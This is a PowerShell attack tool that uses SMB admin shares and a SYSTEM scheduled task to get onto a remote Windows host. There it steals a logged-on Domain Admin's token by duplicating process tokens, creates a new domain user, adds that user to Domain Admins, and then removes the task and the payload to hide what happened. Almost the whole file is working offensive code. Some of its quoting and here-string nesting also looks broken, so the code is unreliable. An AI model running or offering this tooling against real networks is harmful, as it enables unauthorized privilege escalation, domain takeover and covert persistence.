<#
.SYNOPSIS
  Interactive PowerShell script to stealthily impersonate a Domain Admin on a remote host
  via scheduled task and create a new domain user. Supports cleanup and input validation.
#>
$LocalLogOutput = "./task_debug_$((Get-Date -Format 'yyyyMMdd_HHmmss')).log"

function Log($msg) {
    Add-Content -Path $LocalLogOutput -Value "$(Get-Date -Format 'u') - $msg"
}
function Ask($prompt, $default = $null) {
    if ($default) {
        Write-Host "${prompt} [$default]: " -NoNewline
    } else {
        Write-Host "${prompt}: " -NoNewline
    }
    $input = Read-Host
    if ([string]::IsNullOrWhiteSpace($input)) {
        return $default
    }
    return $input
}







# Prompt user
$TargetHost = Ask "Enter the remote target hostname or IP"
$portCheck = Test-NetConnection -ComputerName $TargetHost -Port 445
if (-not $portCheck.TcpTestSucceeded) {
    Write-Host "[-] Port 445 not open on $TargetHost. Cannot proceed." -ForegroundColor Red
    exit 1
}
Write-Host "[+] Port 445 is open. Proceeding..." -ForegroundColor Green

# Gather interactive users
Write-Host "[*] Gathering active sessions via quser..."
try {
    $quserOutput = quser /server:$TargetHost 2>&1
    $users = ($quserOutput | Where-Object { $_ -match '\\' } | ForEach-Object {
        ($_ -split '\s+')[0].Trim()
    }) | Sort-Object -Unique

    if ($users.Count -eq 0) {
        Write-Host "[-] No interactive users found via quser." -ForegroundColor Yellow
    } else {
        Write-Host "[+] Found the following users:"
        $i = 1
        foreach ($u in $users) {
            Write-Host "$i. $u"
            $i++
        }
        $choice = Ask "Enter the number of the user you want to impersonate"
        $TargetDA = $users[$choice - 1]
        if (-not $TargetDA) {
            Write-Host "[-] Invalid user selection. Exiting." -ForegroundColor Red
            exit 1
        }

        Write-Host "[*] Validating session for '$TargetDA'..."
        $sessionInfo = quser /server:$TargetHost 2>&1
        $activeSession = $sessionInfo | Where-Object { $_ -match "$TargetDA" }
        if (-not $activeSession) {
            Write-Host "[-] No active session found for user '$TargetDA'. Aborting." -ForegroundColor Yellow
            exit 1
        }
        Write-Host "[+] Session confirmed for $TargetDA"
    }
} catch {
    Write-Host "[-] quser failed. Manual input required."
    $TargetDA = Ask "Enter the domain admin username to impersonate"
}

# User inputs
$Username = Ask "Enter the new domain username to create" "pentester"
$Password = Ask "Enter the password for the new user" "RedTeam!2024"
$ScriptName = "payload_$((Get-Random).ToString('x')).ps1"
$TaskName = "Updater_$((Get-Random).ToString('x'))"
$RemotePath = "C$\Windows\Temp"
$remoteScriptPath = "\\$TargetHost\$RemotePath\$ScriptName"
$remoteLogPath = "\\$TargetHost\$RemotePath\task_debug.log"

# Build payload script
$payload = @"
param(
  [string]$Username = '$Username',
  [string]$Password = '$Password',
  [string]$TargetUser = '$TargetDA',
  [string]$LogFile = 'C:\Windows\Temp\task_debug.log'
)

function L($m) { Add-Content -Path $LogFile -Value "[*] $m" }

Add-Type -TypeDefinition @"

using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class TokenUtils {
    public const int TOKEN_QUERY = 0x0008;
    public const int TOKEN_DUPLICATE = 0x0002;
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@


function G {
    $procs = Get-Process | Where-Object { $_.SessionId -ne 0 -and $_.Id -ne $PID }
    foreach ($proc in $procs) {
        try {
            $hProc = [TokenUtils]::OpenProcess(0x1000, $false, $proc.Id)
            if ($hProc -eq [IntPtr]::Zero) { continue }
            $hToken = [IntPtr]::Zero
            if (-not [TokenUtils]::OpenProcessToken($hProc, 0x0008, [ref]$hToken)) { continue }
            $dupToken = [IntPtr]::Zero
            if ([TokenUtils]::DuplicateToken($hToken, 2, [ref]$dupToken)) {
                if ([TokenUtils]::ImpersonateLoggedOnUser($dupToken)) {
                    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                    if ($id.Name -like "*$TargetUser") {
                        L "Impersonated: $id.Name"
                        return $true
                    }
                    [TokenUtils]::RevertToSelf() | Out-Null
                }
            }
        } catch { continue }
    }
    return $false
}


function C {
    $d = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $d)
    $u = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx)
    $u.SamAccountName = $Username
    $u.SetPassword($Password)
    $u.Enabled = $true
    $u.Save()
    $g = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ctx, 'Domain Admins')
    $g.Members.Add($u)
    $g.Save()
    L "User $Username added to Domain Admins"
}

if (G) { C } else { L '[-] No DA token found.' }
try { Remove-Item -Path $MyInvocation.MyCommand.Definition -Force } catch {}
"@

# Deploy payload
Set-Content -Path $ScriptName -Value $payload
Log 'Payload written to $ScriptName'
Copy-Item -Path $ScriptName -Destination $remoteScriptPath -Force
Log 'Payload copied to remote host.'

$runCmd = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp$ScriptName'
$runTime = (Get-Date).AddMinutes(1).ToString('HH:mm')
schtasks.exe /Create /S $TargetHost /RU SYSTEM /SC ONCE /TN $TaskName /TR '$runCmd' /ST $runTime /F | Out-Null
schtasks.exe /Run /S $TargetHost /TN $TaskName | Out-Null
Log 'Scheduled task $TaskName started.'

Start-Sleep -Seconds 15
schtasks.exe /Delete /S $TargetHost /TN $TaskName /F | Out-Null
Log 'Scheduled task $TaskName deleted.'

Start-Sleep -Seconds 3
try {
    Copy-Item -Path $remoteLogPath -Destination $LocalLogOutput -Force
    Write-Host '[+] Remote log copied to $LocalLogOutput'
} catch {
    Write-Host '[-] Could not copy remote log: $_'
}

$cleanup = Ask 'Would you like to delete the remote payload script? (y/n)' 'y'
if ($cleanup -eq 'y') {
    Remove-Item -Path $remoteScriptPath -Force
    Log 'Remote script $remoteScriptPath deleted.'
    Write-Host '[+] Remote script cleaned up.'
} else {
    Write-Host '[!] Remote script left intact.'
}
Write-Host '[V] Done.'
Log 'Complete.'
@"
